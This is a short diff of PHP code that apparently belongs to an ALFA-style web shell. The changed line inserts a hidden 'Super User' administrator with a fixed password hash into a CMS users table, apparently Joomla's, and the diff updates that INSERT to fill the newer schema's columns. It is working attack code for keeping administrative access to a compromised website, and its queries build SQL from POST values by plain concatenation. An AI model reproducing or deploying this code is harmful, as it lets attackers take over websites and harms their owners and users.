@@ -3962,7 +3962,7 @@ $admin = $_POST['alfa8'];
 $SQL = $_POST['alfa9'];
 $prefix = $_POST['alfa10'];
 $conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
-$solevisible=@mysqli_query($conn,"insert into ".$prefix."users (id,name,username,email,password,registerDate) values(9999,'Super User','".$admin."','".$SQL."','7e3822c5a128255b96fb550a87845673','2020-02-02 09:29:56')") or die(mysqli_error($conn));
+$solevisible=@mysqli_query($conn,"insert into ".$prefix."users (id,name,username,email,password,block,sendEmail,registerDate,lastvisitDate,activation,params,lastResetTime,resetCount,otpKey,otep,requireReset) values(952116,'Super User','".$admin."','".$SQL."','7e3822c5a128255b96fb550a87845673','0','0','2016-02-02 09:29:56','2020-05-21 07:08:28','','','2017-05-21 07:08:28','0','','','0')") or die(mysqli_error($conn));
 $solevisible=@mysqli_query($conn,"select id from ".$prefix."users where username='".$admin."'") or die(mysqli_error($conn));
 $sole =@mysqli_num_rows($solevisible);
 if ($sole == 1){
